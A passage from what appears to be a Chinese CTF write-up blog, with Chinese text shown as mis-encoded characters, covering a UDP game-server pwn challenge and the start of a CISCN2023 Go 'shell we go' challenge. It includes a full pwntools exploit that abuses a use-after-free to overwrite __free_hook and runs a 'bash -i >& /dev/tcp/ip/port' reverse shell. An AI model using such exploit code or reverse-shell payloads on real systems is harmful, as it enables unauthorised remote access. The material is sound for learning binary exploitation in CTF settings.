æ®µå¾€ä¸‹å¤šç¿»å‡ è¡Œå°±å¯ä»¥çœ‹åˆ°ifåæœ‰ä¸ªcmpå­—æ ·çš„å‡½æ•°ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°è¿™ä¸ªå°±æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œä¸ç”¨ä¸Šé¢é‚£ä¹ˆéº»çƒ¦ï¼ˆğŸ§ï¼‰</p><img src= "/img/14/Screenshot 2023-06-27 224513.png"><p>â€‹                              </p><p>æœ€åå¯ä»¥å¾—åˆ°æ¯”è¾ƒçš„å­—ç¬¦ä¸²ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">login <br>register <br>purchase <br>fight <br>draw_000001 <br>draw_011214 <br>show_infomation <br>Data_testing_console <br>write_signature<br></code></pre></td></tr></table></figure><p>â€‹                                               </p><h4 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h4><p>çŸ¥é“è¾“å…¥ä»€ä¹ˆå‘½ä»¤ï¼Œæ¥ä¸‹æ¥å°±å®¹æ˜“å¤šäº†ã€‚</p><p>loginå‘½ä»¤çš„æ ¼å¼æ˜¯ç»™æç¤ºçš„ï¼Œå¯ä»¥ç›´æ¥ç±»æ¯”åˆ°registerå‘½ä»¤ã€‚</p><p>purchaseæ˜¯ç”¨å¾—åˆ°çš„100 currencyå»ä¹°å¡ã€‚</p><p>draw_000001å’Œdraw_011214å»æŠ½heroã€‚</p><p>fightæ˜¯å»æ‰“æ€ªå‡çº§ï¼Œå‡åˆ°10çº§è¿™ä¸ªæ¸¸æˆå°±ç®—æ˜¯èµ¢äº†ã€‚</p><p>Data_testing_consoleåªæœ‰åœ¨fightå®Œè¿™ä¸ªæ¸¸æˆåæ‰èƒ½ä½¿ç”¨ã€‚</p><p>fightçš„æ¸¸æˆèµ¢äº†ä¹‹åå¹¶æ²¡æœ‰ä»€ä¹ˆå»æ‰§è¡Œæ¼æ´ä»£ç å—çš„å¥–åŠ±ï¼Œæ¥ä¸‹æ¥å°±åªèƒ½å»çœ‹çœ‹Data_testing_consoleäº†ã€‚</p><p>è¿›å…¥Data_testing_consoleå‘½ä»¤ï¼Œä¸€å¼€å§‹å°±æç¤ºæˆ‘ä»¬<code>Enter function name:</code>ï¼ŒæŸ¥çœ‹<code>server_game::Data_testing_console</code>å‡½æ•°çš„ä¼ªä»£ç ï¼Œè¿™é‡Œçœ‹ä¼ªä»£ç ä¹Ÿæ˜¯åªçœ‹<code>UdpSocket::recv_from</code>å’Œ<code>UdpSocket::send_to</code>å‡½æ•°é™„è¿‘çš„ã€‚å‘ç°åœ¨è¯¥å‡½æ•°ä¸­<code>UdpSocket::send_to</code>åªè°ƒç”¨è¿‡ä¸€æ¬¡ï¼Œå‘é€æ¥ä¸‹æ¥çš„å­—ç¬¦ä¸²<code>Enter the command:</code>ï¼Œä½¿ç”¨gdb attachä¸€ä¸‹è¿›ç¨‹å‘ç°è¯¥è¿‡ç¨‹æ˜¯åœ¨<code>server_game::Memory_Debug_console</code>å‡½æ•°ä¸­ï¼ˆå¸¦server_gameå­—æ®µçš„å‡½æ•°éƒ½éœ€è¦çœ‹çœ‹ ğŸ˜«ï¼‰</p><img src="/img/14/Screenshot 2023-06-27 231805.png" style="zoom: 50%;" /><p>æŸ¥çœ‹<code>server_game::Memory_Debug_console</code>å‡½æ•°ä¼ªä»£ç å‘ç°æœ‰libcå­—æ®µ</p><img src="/img/14/Screenshot 2023-06-27 231914.png" style="zoom: 80%;" /><p>è”æƒ³åˆ°function nameè¾“å…¥readåå‘ç°ç›´æ¥ä¼ å›äº†readå‡½æ•°libcåœ°å€</p><img src="/img/14/Screenshot 2023-06-27 234719.png"><p>å‰©ä¸‹çš„è¾“å…¥å‘½ä»¤å°±ä½¿ç”¨å’Œpart2ä¸€æ ·çš„åŠæ³•æ‰¾åˆ°å‘½ä»¤å­—æ®µä¸ºdata_pushå’Œquit</p><p>â€‹                                                         </p><h4 id="part4"><a href="#part4" class="headerlink" title="part4"></a>part4</h4><p>è¾“å…¥quitå°±æ˜¯é€€å‡ºæ²¡ä»€ä¹ˆå¯è¯´çš„ï¼Œè¾“å…¥data_pushååˆä¼šè¿›å…¥ä¸€ä¸ª<code>server_game::data_push</code>å‡½æ•°ï¼Œä¹Ÿæ˜¯ç”¨å‰é¢çš„æ–¹æ³•æ‰¾åˆ°operationå­—æ®µpushå’Œgrowã€‚è¾“å…¥ä¸åŒçš„operationæ¥ç€éƒ½ä¼šæœ‰ä¸€ä¸ªvector numberå»ç”¨switchåˆ¤æ–­ï¼Œæœ€åè¾“å…¥ä¸€ä¸ªvalueã€‚</p><p>pushå’Œgrowï¼Œå®ƒä»¬switchçš„caseä¸­ä»£ç æ®µå¤§è‡´ç›¸åŒã€‚</p><p>å°±ä¼ªä»£ç è€Œè¨€è‡ªå·±å®Œå…¨æ— æ³•çŸ¥é“å“ªäº›å‡½æ•°æ˜¯éœ€è¦é‡ç‚¹å…³æ³¨çš„ï¼Œåªèƒ½ä½¿ç”¨gdbä¸€æ­¥ä¸€æ­¥å»è°ƒè¯•ï¼Œè°ƒè¯•çš„æ—¶å€™æ³¨æ„è¾“å…¥çš„valueï¼Œå¦‚æœæ˜¯æŸå‡½æ•°è°ƒç”¨çš„å‚æ•°ä¹Ÿæ˜¯è¯¥valueå°±ä»”ç»†å¯¹æ¯”ä¸€ä¸‹å‡½æ•°å‰åå¯„å­˜å™¨ä»¥åŠ[å¯„å­˜å™¨]å€¼çš„å˜åŒ–ã€‚</p><p>è¿™é‡Œæˆ‘è°ƒè¯•pushæ“ä½œæ—¶è¾“å…¥çš„valueä¸º48ï¼ˆvalueå°½é‡ç‰¹æ®Šä¸€ç‚¹ï¼Œè¿™æ ·ä¾¿äºè§‚å¯Ÿï¼‰ï¼Œæœ€åå®šä½åˆ°ä¸€ä¸ªå¸¦pushå­—æ®µçš„å‡½æ•°</p><img src="/img/14/Screenshot 2023-06-28 001800.png" style="zoom:50%;" /><p>rdiä¸­çš„å€¼å‰åå¯¹æ¯”å¦‚ä¸‹ï¼š</p><img src= "/img/14/Screenshot 2023-06-28 001855.png"><p>â€‹                             </p><img src= "/img/14/Screenshot 2023-06-28 001912.png"><p>å¤šè°ƒè¯•å‡ æ¬¡åå°±å¯ä»¥çŸ¥é“pushçš„æ“ä½œå°±æ˜¯å°†valueä¿å­˜åˆ°æ ˆä¸Šï¼Œvalueä¸èƒ½å¤§äº0x100ï¼Œvalueå°±æ˜¯ä¸€ä¸ªå­—èŠ‚çš„ASCIIç ï¼Œå‰ä¸€ä¸ªå­—æ®µå°±æ˜¯pushæ•°æ®çš„å¤§å°ã€‚</p><p>vector numberå°±æ˜¯å¯ä»¥è®©valueä¿å­˜åˆ°ä¸åŒåŒºåŸŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># vector number = 1æ—¶ï¼Œåœ¨0x95a0 + rsp(server_game::data_pushå‡½æ•°ä¸­çš„æ ˆé¡¶) </span><br><span class="hljs-comment"># vector number = 2æ—¶ï¼Œåœ¨0x96b0 + rsp</span><br><span class="hljs-comment"># vector number = 3æ—¶ï¼Œåœ¨0x97c0 + rsp</span><br><span class="hljs-comment"># æ¯ä¸ªåŒºåŸŸæ­£å¥½ç›¸å·®0x110</span><br></code></pre></td></tr></table></figure><p>â€‹                                         </p><p>è°ƒè¯•growæ“ä½œæ—¶ï¼Œä¹Ÿæ˜¯å®šä½åˆ°ä¸€ä¸ªå¸¦growå­—æ®µçš„å‡½æ•°ï¼š</p><img src="/img/14/Screenshot 2023-06-28 012725.png" style="zoom:50%;" /><p>åŒæ—¶è¯¥å‡½æ•°ä¼ªä»£ç ä¸­çš„æ¯”è¾ƒçš„æ•°æ®å­—æ®µæ„ä¹‰å¦‚ä¸‹ï¼š</p><img src="/img/14/Screenshot 2023-06-28 012544.png"><p>åœ¨æœ€åæœ‰ä¸€ä¸ªå¸¦heapå­—æ®µçš„å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨ä¸reallocå‡½æ•°å‡ ä¹ä¸€æ ·ï¼š</p><img src="/img/14/Screenshot 2023-06-28 012849.png"><p>â€‹               </p><p>æœ€åå‘ç°vector numberçš„ä½œç”¨ä¸pushä¸€æ ·ï¼Œé™¤äº†vector number &#x3D; 2ä»¥å¤–ï¼Œåˆ«çš„vector numberéƒ½åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚</p><p>å½“vector number &#x3D; 2ï¼Œè¾“å…¥çš„valueï¼ˆå¤§äº0x100æ—¶å°±ä½¿ç”¨å †å­˜æ•°æ®ï¼‰ä¸å…ˆå‰çš„valueä¸€æ ·æ—¶è¯¥å †å—å°±ä¼šé‡Šæ”¾ï¼Œä½†æ˜¯æŒ‡é’ˆæœªæ¸…é›¶ï¼Œå¹¶ä¸”ä¾æ—§å¯ä»¥ä½¿ç”¨pushä¼ å…¥æ•°æ®ï¼Œå°±æ˜¯ä¸€ä¸ªuafã€‚</p><p>â€‹                           </p><h4 id="part5"><a href="#part5" class="headerlink" title="part5"></a>part5</h4><p>æ¼æ´åˆ©ç”¨å¾ˆç®€å•ï¼Œlibcçš„åœ°å€æ˜¯ç™½ç»™çš„ï¼Œç›´æ¥åˆ©ç”¨uafæ¥å®ç°tcache attackå»ä¿®æ”¹free_hookï¼Œæœ€ååå¼¹shellã€‚</p><p>æœ€åˆæˆ‘çš„åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">size = <span class="hljs-number">0x1d0</span><br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base))<br>grow(<span class="hljs-number">4</span>, size)<br>grow(<span class="hljs-number">5</span>, size)<br>send_payload(<span class="hljs-number">5</span>, p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base))<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨vector number &#x3D; 2æ—¶å¯ä»¥ä½¿ç”¨å¤šæ¬¡ï¼Œå½¢æˆdouble freeåç›´æ¥ä¿®æ”¹tcache nextæŒ‡é’ˆä¸ºfree_hookï¼Œå†åˆ©ç”¨growç”³è¯·åˆ°free_hookï¼Œæœ€åpushæ•°æ®åˆ°free_hookã€‚ä½†æ˜¯å®é™…ä¸Šè¿™æ ·å‘free_hookå†™å…¥æ•°æ®æ˜¯ç›´æ¥æŠ¥é”™çš„ï¼Œå½“pushå®Œç¬¬ä¸€ä¸ªå­—èŠ‚åˆ°free_hookä¸Šåï¼Œæ¥ä¸‹æ¥è°ƒç”¨drop_in_placeå‡½æ•°ï¼š</p><img src="/img/14/Screenshot 2023-06-27 164146.png"><p>æœ€åæœ‰è°ƒç”¨çš„freeçš„åŠŸèƒ½ï¼Œè¿™æ—¶free_hookä¸­ä»…æœ‰å†™å…¥çš„ä¸€ä¸ªå­—èŠ‚ï¼Œä½†ä¾æ—§å»è°ƒç”¨free_hookä¸­çš„é”™è¯¯åœ°å€ï¼š</p><img src="/img/14/Screenshot 2023-06-28 015131.png"><p>â€‹                                                                                         </p><p>å½“æ—¶æˆ‘å°±è‡ªé—­äº†ğŸ˜­ï¼Œä¹‹åæˆ‘çœ‹<a href="https://blog.wm-team.cn/index.php/archives/38/#Brave+Knights+and+Rusty+Swords">W&amp;Mçš„wp</a>åæ‰çŸ¥é“pushæ“ä½œä¹Ÿèƒ½ç”³è¯·å †å—ï¼Œåˆšå¼€å§‹ä¸ä½¿ç”¨growï¼Œç›´æ¥pushï¼Œå¦‚æœpushçš„æ•°æ®å¤§äº0x100ä¹Ÿæ˜¯ä¼šç”³è¯·å †ä¸Šçš„å†…å­˜ï¼Œæ”¹ç”¨pushå°±å¯ä»¥è§£å†³ä¸Šé¢çš„é—®é¢˜ã€‚</p><p>â€‹                                     </p><p>æœ€åå®Œæ•´çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = remote(<span class="hljs-string">&#x27;192.168.184.133&#x27;</span>,<span class="hljs-number">8080</span>, typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;server_game&#x27;</span>)<br>libc = elf.libc<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p.sendline(<span class="hljs-string">b&#x27;register a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Registration successful! You have received 100 currency.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;login a a&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Welcome back&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;purchase 100&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Purchase successful! You have received 10 cards.&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;draw_000001&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;You have received a new character&#x27;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    t = <span class="hljs-string">b&#x27;&#x27;</span><br>    p.sendline(<span class="hljs-string">b&#x27;fight&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;fight: \n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p.sendline(<span class="hljs-string">b&#x27;attack&#x27;</span>)<br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> t != <span class="hljs-string">b&#x27;\n&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        t = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>            <span class="hljs-keyword">break</span><br>        p.recvuntil(<span class="hljs-string">b&#x27;flee\n&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!&#x27;</span> <span class="hljs-keyword">in</span> t:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">grow</span>(<span class="hljs-params">num, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;grow&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the grow value:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">num, value</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the operation:&#x27;</span>, <span class="hljs-string">b&#x27;push&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the vector number:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;value:&#x27;</span>, <span class="hljs-built_in">str</span>(value).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload</span>(<span class="hljs-params">num, payload</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>        push(num, i)<br><br>p.sendline(<span class="hljs-string">b&#x27;Data_testing_console&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter function name:&#x27;</span>, <span class="hljs-string">b&#x27;free&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>libc.address = libc_base<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the command:&#x27;</span>, <span class="hljs-string">b&#x27;data_push&#x27;</span>)<br><br><br>size = <span class="hljs-number">0x200</span><br>grow(<span class="hljs-number">1</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">2</span>, size)<br>send_payload(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>grow(<span class="hljs-number">2</span>, size)<br>grow(<span class="hljs-number">3</span>, size)<br>send_payload(<span class="hljs-number">3</span>, p64(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x58</span>))<br>grow(<span class="hljs-number">4</span>, size)<br><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x1d0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>send_payload(<span class="hljs-number">5</span>, payload)<br>grow(<span class="hljs-number">5</span>, size)<br><br><span class="hljs-comment"># push 1 0x95a0  </span><br><span class="hljs-comment"># push 2 0x96b0</span><br><span class="hljs-comment"># push 3 0x97c0</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2023 shell we go</title>
    <link href="/2023/05/30/CISCN2023-shell-we-go/"/>
    <url>/2023/05/30/CISCN2023-shell-we-go/</url>
    
    <content type="html"><![CDATA[<p>åœ¨å›½èµ›ä¸Šé‡åˆ°çš„ä¸€é“goè¯­è¨€çš„é¢˜ï¼Œè‡ªå·±ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹å¤ç°çš„è¿‡ç¨‹ã€‚</p><p>â€‹</p><p>ç”±äºgoè¯­è¨€ç¼–è¯‘éƒ½æ˜¯é™æ€çš„ï¼Œè€Œä¸”ç¨‹åºæŠŠæ‰€æœ‰çš„ç¬¦å·è¡¨éƒ½å»æ‰äº†ï¼Œå¯¹äºé€†å‘çš„éš¾åº¦å¤§å¤§æå‡ï¼Œè™½ç„¶å¯ä»¥é€šè¿‡è¾“å‡ºçš„å­—ç¬¦ä¸²å¿«é€Ÿæ‰¾åˆ°ä¸»å‡½æ•°ï¼Œä½†æ˜¯å¯¹äºä¸€äº›goè¯­è¨€çš„åº“å‡½æ•°æ ¹æœ¬å°±æ— æ³•åˆ¤æ–­ï¼Œåˆ†æè¿™äº›åº“å‡½æ•°åªä¼šæµªè´¹å¤§é‡æ—¶é—´ï¼›è¿™é‡Œä½¿ç”¨ä¸€ä¸‹<a href="https://github.com/renshareck/IDAGolangHelper_SupportGo1.20">IDAGolangHelper</a>ï¼Œå¯ä»¥ä¿®å¤goçš„ç¬¦å·è¡¨ã€‚</p><p>è¿›å…¥ç¨‹åºåå¾ˆå¿«å°±æƒ³åˆ°è¾“å…¥å¸¸ç”¨çš„shellå‘½ä»¤ï¼Œä½†æ˜¯è¾“å‡ºåªæœ‰â€œCert Is A Mustâ€ï¼ŒæŸ¥æ‰¾â€Certâ€œå­—ç¬¦ä¸²å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªâ€Cert complete, you can explore moreâ€œï¼Œè¯´æ˜éœ€è¦è¾“å…¥ä¸€äº›ä¸œè¥¿è®¤è¯ï¼š</p><img src="/img/13/Screenshot 2023-05-30 172622.png" style="zoom:80%;" /><p>â€‹</p><p>å¼•ç”¨è¯¥å­—ç¬¦ä¸²çš„å‡½æ•°ä¸ºmain_unk_func0b01ï¼Œå¥½åƒçœ‹ä¸å‡ºä»€ä¹ˆä¸œè¥¿ï¼š</p><img src="/img/13/Screenshot 2023-05-30 173651.png" style="zoom: 80%;" /><p>æ¥ç€å‘ä¸Šæ‰¾å¼•ç”¨main_unk_func0b01çš„å‡½æ•°ï¼Œçœ‹åˆ°main_unk_func0b05å‡½æ•°ï¼Œå¾ˆå¿«å°±å‘ç°ä¼ªä»£ç ä¸­æ²¡æœ‰è°ƒç”¨è¿‡main_unk_func0b01å‡½æ•°çš„ç—•è¿¹ï¼š</p><img src="/img/13/Screenshot 2023-05-30 174350.png" style="zoom: 67%;" /><p>â€‹</p><p>ç›´æ¥æŸ¥çœ‹è¯¥å‡½æ•°çš„æ±‡ç¼–ï¼Œæœç„¶ida7.7çš„ä¼ªä»£ç åŠŸèƒ½å¯¹goæ— æ³•å‡†ç¡®è¯†åˆ«ã€‚å‡½æ•°ä¸­ä¸‹é¢çš„å—å…¨æ˜¯cmpï¼Œå°†ä¸€äº›å¥‡æ€ªçš„16è¿›åˆ¶æ•°å˜æˆå­—ç¬¦ä¸²ï¼ˆéœ€è¦é€†åºçœ‹ï¼‰ï¼Œå¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°åŸºæœ¬ä¸Šå…¨æ˜¯ä¸€ä¸ªå…ˆæ¯”è¾ƒå­—ç¬¦ä¸²é•¿åº¦ï¼Œå†å»æ¯”è¾ƒå­—ç¬¦å†…å®¹çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œshellä¸­ä¸åŒæŒ‡ä»¤çš„å®ç°æ˜¯å°†è¯¥è¿‡ç¨‹é‡å¤å¤šæ¬¡æ¥åˆ¤æ–­æŒ‡ä»¤çš„å†…å®¹ï¼Œè¿›è€Œè·³è½¬åˆ°ç›¸åº”çš„åœ°æ–¹å»å®ç°ä¸åŒæŒ‡ä»¤çš„åŠŸèƒ½ï¼š</p><img src="/img/13/Screenshot 2023-05-30 184428.png" style="zoom: 50%;" /><p>åœ¨cmpæ—¶ï¼Œæ•°æ®å…¨æ˜¯åœ¨raxçš„åœ°å€è·å–çš„ï¼Œä¹Ÿå¾ˆå®¹æ˜“çœ‹åˆ°ä¸€ä¸ªè§„å¾‹ï¼š[rax + i]ä¸ºå­—ç¬¦ä¸²çš„åœ°å€ï¼Œ[rax + i * 8]ä¸ºå­—ç¬¦ä¸²çš„å¤§å°ï¼Œraxå¯„å­˜å™¨ä¹‹å‰ä¸€æ¬¡æ”¹å˜æ˜¯åœ¨è°ƒç”¨strings_genSplitå‡½æ•°åï¼Œé€šè¿‡gdbè°ƒè¯•å‘ç°è¯¥å‡½æ•°é€šè¿‡ç©ºæ ¼æ¥åˆ†å‰²å­—ç¬¦ä¸²ï¼Œraxä¿å­˜å­—ç¬¦ä¸²åˆ†å‰²åçš„ä¿¡æ¯ï¼Œrbxæ˜¯åˆ†å‰²çš„å—æ•°ï¼š</p><p>â€‹        <img src="/img/13/Screenshot 2023-05-30 192441.png" style="zoom: 50%;" /></p><p>â€‹<img src="/img/13/Screenshot 2023-05-30 192627.png" style="zoom:50%;" /></p><p>â€‹</p><p>æ¥ä¸‹æ¥å¾ˆå¤šä¸œè¥¿éƒ½å¯ä»¥é¡ºåˆ©çœ‹æ‡‚äº†ï¼Œæƒ³è¿›å…¥main_unk_func0b0å‡½æ•°ï¼Œåˆ†å‰²çš„å—æ•°ä¸º3ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ä¸ºâ€certâ€ï¼Œç¬¬äºŒä¸ªå­—ç¬¦ä¸²ä¸ºâ€nAcDsMicNâ€ï¼Œç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²è¿›å…¥main_unk_func0b0å‡½æ•°åå†å»è¿›ä¸€æ­¥æ¯”è¾ƒã€‚æ¥ä¸‹æ¥å†è¿›å…¥main_unk_func0b0åˆ†æï¼Œçœ‹åˆ°crypto_rc4_NewCipherã€encoding_base64__ptr_Encoding_EncodeToStringè¿™äº›åº“å‡½æ•°ï¼Œç›´æ¥å»ç½‘ä¸Šæœä¸€ä¸‹ï¼Œè¿™äº›å‡½æ•°å°±æ˜¯cr4åŠ å¯†åå†è¿›è¡Œbase64ç¼–ç ï¼Œï¼Œæœ€åä¸â€JLIX8pbSvYZu&#x2F;WaGâ€æ¯”è¾ƒï¼Œé€šè¿‡è¿™ä¸ªç½‘ç«™å°±å¯ä»¥è§£å¯†ï¼š<a href="https://www.lddgo.net/encrypt/rc4">https://www.lddgo.net/encrypt/rc4</a></p><img src="/img/13/Screenshot 2023-05-30 013458.png" style="zoom:50%;" /><p>â€‹</p><p>è¾“å…¥â€cert nAcDsMicN S33UAga1n@#!â€åå°±èƒ½çœŸæ­£å»ä½¿ç”¨è¿™ä¸ªshellï¼Œå›è¿‡å¤´å»çœ‹main_unk_func0b05å‡½æ•°ä¸­æ¯”è¾ƒçš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å‘ç°çš„æŒ‡ä»¤æœ‰â€lsâ€ã€â€cdâ€ã€â€catâ€ã€â€whoamiâ€ã€â€echoâ€ã€â€exitâ€ï¼Œå…¶ä¸­åªæœ‰â€lsâ€å’Œâ€cdâ€æ‰èƒ½çœŸæ­£å®ç°ç›¸åº”çš„åŠŸèƒ½ï¼Œè€ŒcatåŒ¹é…åˆ°flagæ—¶ä¼šè¾“å‡ºä¸€ä¸ªå‡çš„flag(ğŸ˜¦)ï¼ŒçœŸæ­£æœ‰ç”¨çš„æ˜¯echoä¼šè¿›å…¥main_unk_func0b04å‡½æ•°ã€‚</p><p>main_unk_func0b04å‡½æ•°ä¸­é€šè¿‡è¾“å…¥çš„å­—ç¬¦ä¸²çš„å¤§å°ï¼ˆé™¤ç©ºæ ¼ï¼‰ä½œä¸ºå¾ªç¯çš„å¤§å°ï¼Œå°†å…¶å•ä¸ªå­—èŠ‚å¾ªç¯å¤åˆ¶åˆ°æ ˆä¸­ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªechoçš„æ ˆæº¢å‡ºï¼Œmain_unk_func0b04å‡½æ•°ä¼šå…ˆå¯¹æ¯ä¸€ä¸ªå­—ç¬¦ä¸²å—çš„å¤§å°è¿›è¡Œæ£€æŸ¥ï¼Œç›´æ¥ä½¿ç”¨ç©ºæ ¼ç»•è¿‡å³å¯ï¼š</p><img src="/img/13/Screenshot 2023-05-30 201147.png" style="zoom:50%;" 